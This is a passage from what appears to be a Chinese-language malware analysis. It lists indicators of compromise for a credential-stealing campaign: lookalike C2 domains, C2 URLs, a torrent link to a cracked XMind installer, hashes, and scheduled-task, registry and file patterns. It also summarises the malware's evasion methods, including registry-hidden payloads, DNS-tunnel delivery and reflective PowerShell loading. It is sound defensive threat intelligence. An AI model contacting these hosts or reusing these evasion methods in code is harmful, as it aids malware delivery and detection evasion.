wmail-cdn.xyz
wmail-schnellvpn.com
wmail-schnellvpn.xyz
fairu-endpoint.com
fairu-endpoint.xyz
fairu-blog.com
fairu-blog.xyz
fairu-chat.com
fairu-chat.xyz
fairu-cdn.com
fairu-cdn.xyz
fairu-schnellvpn.com
fairu-schnellvpn.xyz
bideo-endpoint.com
bideo-endpoint.xyz
bideo-blog.com
bideo-blog.xyz
bideo-chat.com
bideo-cdn.com
bideo-cdn.xyz
bideo-schnellvpn.com
bideo-schnellvpn.xyz
privatproxy-endpoint.com
privatproxy-endpoint.xyz
privatproxy-blog.com
privatproxy-blog.xyz
privatproxy-chat.com
privatproxy-chat.xyz
privatproxy-cdn.com
privatproxy-cdn.xyz
privatproxy-schnellvpn.com
privatproxy-schnellvpn.xyz
ahoravideo-endpoint.com
ahoravideo-endpoint.xyz
ahoravideo-blog.com
ahoravideo-blog.xyz
ahoravideo-chat.com
ahoravideo-chat.xyz
ahoravideo-cdn.com
ahoravideo-cdn.xyz
ahoravideo-schnellvpn.xyz
```

url：

```
http://xboxwindows.com/api/v1/$guid
http://xboxwindows.com/api/$guid
https://www.1377x.to/torrent/5505841/XMind-2022-v22-11-2677-x64-Multilingual-crack-crackerfg/
```

hash_md5：

```
2656a4f7c113ac37df603a3c27f0ea0c
157683de4c4cbedcb74d8d66581217a7
```

计划任务：

```
\Microsoft\Windows\Diagnosis\RecommendedTroubleshootingScanner[0-9a-z]{5}
```

注册表：

```
HKEY_LOCAL_MACHINE\SOFTWARE\SolidWorks CorporationJQVQJ\c8dO7TYiv 
HKEY_LOCAL_MACHINE\SOFTWARE\SolidWorks Corporation 修改而来
```

文件：

```
c:/windows/system32/[0-9A-Z]{4}.tmp
c:/windows/system32/[0-9A-Z]{4}.tmp/[0-9A-Z]{4}.ps1
```



# 0x04 学习

通过此次分析，我们不难看出这种有一定规模的窃密组织，其整个杀伤链中还是做了很多对抗分析的和检测的手段；

1、payload加密混淆并隐藏到注册表键值中：通过注册表逃避edr的扫描和检测；

2、云端payload拉取采用dns隧道：通过txt记录传输加密payload，逃避ids流量监测；

3、对抗域名被接管情况：通过内置批量域名，并且对payload进行签名，客户端对签名进行校验，从而逃避被接管，对抗研究分析冉渊；

4、分阶段payload加载：通过多阶段从而拉长进程链，逃避edr检测；

5、payload反射加载：通过powershel独有的invoke反射加载，逃避edr检测；
